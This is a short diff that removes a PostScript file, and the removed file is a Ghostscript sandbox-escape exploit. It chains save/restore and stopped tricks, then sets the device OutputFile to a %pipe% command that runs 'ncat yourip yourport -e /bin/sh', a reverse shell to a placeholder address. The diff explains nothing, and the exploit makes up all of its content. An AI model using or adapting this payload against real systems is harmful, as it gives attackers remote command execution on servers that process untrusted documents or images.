@@ -1,8 +1,0 @@
-%!PS
-userdict /setpagedevice undef
-save
-legal
-{ null restore } stopped { pop } if
-{ legal } stopped { pop } if
-restore
-mark /OutputFile (%pipe%ncat yourip yourport -e /bin/sh) currentdevice putdeviceprops
